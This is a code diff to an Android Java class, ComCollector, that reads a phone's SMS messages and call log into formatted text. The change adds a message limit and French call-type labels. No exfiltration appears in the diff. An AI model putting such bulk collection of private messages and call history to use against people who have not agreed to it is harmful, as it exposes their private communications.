@@ -15,7 +15,7 @@ public class ComCollector {
 
     private static final String TAG = "ComCollector";
 
-    public static String readSMS(Context context) {
+    public static String readSMS(Context context , Integer limit) {
         if (ActivityCompat.checkSelfPermission(context, Manifest.permission.READ_SMS) != PackageManager.PERMISSION_GRANTED) {
             Log.e(TAG, "Permission READ_SMS manquante !");
             return "Permission manquante.";
@@ -29,8 +29,10 @@ public class ComCollector {
                 null,
                 Telephony.Sms.DEFAULT_SORT_ORDER);
 
+        limit = (limit == null) ? 50 : limit;
+
         if (cursor != null) {
-            while (cursor.moveToNext()) {
+            while (cursor.moveToNext() && limit > 0) {
                 String address = cursor.getString(cursor.getColumnIndexOrThrow(Telephony.Sms.ADDRESS));
                 String body = cursor.getString(cursor.getColumnIndexOrThrow(Telephony.Sms.BODY));
                 String date = cursor.getString(cursor.getColumnIndexOrThrow(Telephony.Sms.DATE));
@@ -39,6 +41,8 @@ public class ComCollector {
                         .append("\nDate: ").append(date)
                         .append("\nMessage: ").append(body)
                         .append("\n\n");
+
+                limit--;
             }
             cursor.close();
         }
@@ -64,10 +68,36 @@ public class ComCollector {
         if (cursor != null) {
             while (cursor.moveToNext()) {
                 String number = cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls.NUMBER));
-                String type = cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls.TYPE));
+                String type;
+                int callType = cursor.getInt(cursor.getColumnIndexOrThrow(CallLog.Calls.TYPE));
                 String date = cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls.DATE));
                 String duration = cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls.DURATION));
-
+                switch (callType) {
+                    case CallLog.Calls.INCOMING_TYPE:
+                        type = "Appel entrant";
+                        break;
+                    case CallLog.Calls.OUTGOING_TYPE:
+                        type = "Appel sortant";
+                        break;
+                    case CallLog.Calls.MISSED_TYPE:
+                        type = "Appel manqué";
+                        break;
+                    case CallLog.Calls.VOICEMAIL_TYPE:
+                        type = "Répondeur";
+                        break;
+                    case CallLog.Calls.REJECTED_TYPE:
+                        type = "Appel rejeté";
+                        break;
+                    case CallLog.Calls.BLOCKED_TYPE:
+                        type = "Appel bloqué";
+                        break;
+                    case CallLog.Calls.ANSWERED_EXTERNALLY_TYPE:
+                        type = "Appel répondu via un autre appareil (Bluetooth ou autre)";
+                        break;
+                    default:
+                        type = "Type inconnu";
+                        break;
+                }
                 callLogData.append("Number: ").append(number)
                         .append("\nType: ").append(type)
                         .append("\nDate: ").append(date)
